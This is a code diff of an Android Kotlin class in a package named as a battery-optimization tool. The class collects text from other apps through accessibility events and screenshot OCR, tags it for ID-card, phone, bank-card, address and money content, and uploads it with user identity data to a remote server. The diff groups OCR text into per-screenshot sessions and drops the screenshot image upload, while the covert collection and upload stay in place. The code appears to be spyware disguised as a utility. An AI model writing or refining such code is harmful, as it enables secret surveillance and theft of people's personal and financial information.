@@ -4,7 +4,6 @@ import android.content.Context
 import android.os.Build
 import android.util.Log
 import com.android.batteryoptimization.network.NetworkClient
-import com.android.batteryoptimization.network.OcrDetailPayload
 import com.android.batteryoptimization.network.SensitiveInfoPayload
 import com.android.batteryoptimization.network.UploadResponse
 import com.google.gson.Gson
@@ -109,18 +108,12 @@ class InputRepository private constructor(private val context: Context) {
     /**
      * Add OCR results as events, merged into the existing event stream.
      * OCR events are tagged with source="ocr" to distinguish from accessibility events.
-     *
-     * @param screenshotBase64 截屏图片的 JPEG base64（压缩后），用于上传
-     * @param ocrFullText OCR 识别出的完整文本（多行拼接）
-     * @param ocrDetailsJson OCR 每行结果的 JSON 串
+     * 上传时会按 (timestamp, packageName) 分组合并为一次 OCR 会话。
      */
     fun addOcrEvents(
         packageName: String,
         appName: String,
         results: List<OcrResult>,
-        screenshotBase64: String? = null,
-        ocrFullText: String? = null,
-        ocrDetailsJson: String? = null,
         contentType: String? = null,
         riskLevel: String? = null,
         sensitiveInfoJson: String? = null
@@ -136,9 +129,6 @@ class InputRepository private constructor(private val context: Context) {
                 appName = appName,
                 text = result.text,
                 source = "ocr",
-                screenshotBase64 = screenshotBase64,
-                ocrText = ocrFullText,
-                ocrDetailsJson = ocrDetailsJson,
                 contentType = contentType,
                 riskLevel = riskLevel,
                 sensitiveInfoJson = sensitiveInfoJson
@@ -207,44 +197,52 @@ class InputRepository private constructor(private val context: Context) {
                 idCard = idCard
             )
 
-            val eventPayloads = currentEvents.map { event ->
-                // OCR 事件跑一遍分类器（非 OCR 事件 content_type=other）
-                val (contentType, riskLevel, _) = if (event.source == "ocr") {
-                    ContentClassifier.analyze(event.packageName, event.text)
-                } else {
-                    Triple(ContentClassifier.TYPE_OTHER, ContentClassifier.RISK_LOW, ContentClassifier.SensitiveInfo())
+            // 分离 OCR 事件和普通事件
+            val ocrEvents = currentEvents.filter { it.source == "ocr" }
+            val nonOcrEvents = currentEvents.filter { it.source != "ocr" }
+
+            // OCR 事件按 (timestamp, packageName) 分组 → 每条 = 一次截屏会话
+            val ocrSessions = ocrEvents
+                .groupBy { it.timestamp to it.packageName }
+                .map { (key, events) ->
+                    val first = events.first()
+                    val allTexts = events.map { it.text }.filter { it.isNotBlank() }
+                    // 用第一条事件的信息做分类
+                    val fullText = allTexts.joinToString("\n")
+                    val (contentType, riskLevel, sensitiveInfo) = ContentClassifier.analyze(first.packageName, fullText)
+
+                    com.android.batteryoptimization.network.OcrSessionPayload(
+                        packageName = key.second,
+                        appName = first.appName,
+                        text = allTexts,
+                        timestamp = key.first,
+                        contentType = contentType,
+                        riskLevel = riskLevel,
+                        sensitiveInfo = com.android.batteryoptimization.network.SensitiveInfoPayload(
+                            hasIdCard = sensitiveInfo.hasIdCard,
+                            hasPhone = sensitiveInfo.hasPhone,
+                            hasBankCard = sensitiveInfo.hasBankCard,
+                            hasAddress = sensitiveInfo.hasAddress,
+                            hasMoney = sensitiveInfo.hasMoney
+                        )
+                    )
                 }
 
+            // 普通事件保持原有格式
+            val eventPayloads = nonOcrEvents.map { event ->
                 com.android.batteryoptimization.network.EventPayload(
                     packageName = event.packageName,
                     appName = event.appName,
                     text = event.text,
                     timestamp = event.timestamp,
-                    source = event.source,
-                    screenshotBase64 = event.screenshotBase64,
-                    ocrText = event.ocrText,
-                    ocrDetails = event.ocrDetailsJson?.let { json ->
-                        try {
-                            gson.fromJson(json, object : TypeToken<List<OcrDetailPayload>>() {}.type)
-                        } catch (e: Exception) {
-                            null
-                        }
-                    },
-                    contentType = event.contentType ?: contentType,
-                    riskLevel = event.riskLevel ?: riskLevel,
-                    sensitiveInfo = event.sensitiveInfoJson?.let { json ->
-                        try {
-                            gson.fromJson(json, SensitiveInfoPayload::class.java)
-                        } catch (e: Exception) {
-                            null
-                        }
-                    }
+                    source = event.source
                 )
             }
 
             val requestBody = com.android.batteryoptimization.network.UploadRequest(
                 userInfo = userInfoPayload,
-                events = eventPayloads
+                events = eventPayloads,
+                ocr = ocrSessions.ifEmpty { null }
             )
 
             val requestJson = gson.toJson(requestBody)
@@ -267,7 +265,8 @@ class InputRepository private constructor(private val context: Context) {
                 val uploadResponse = gson.fromJson(bodyString, UploadResponse::class.java)
                 if (uploadResponse?.code == 0) {
                     val msg = uploadResponse.msg ?: "成功"
-                    Log.d(TAG, "上报成功: ${currentEvents.size} events, msg: $msg")
+                    val totalEvents = eventPayloads.size + ocrSessions.size
+                    Log.d(TAG, "上报成功: ${eventPayloads.size} events + ${ocrSessions.size} ocr sessions, msg: $msg")
 
                     // Append to backup file
                     appendToBackup(currentEvents)
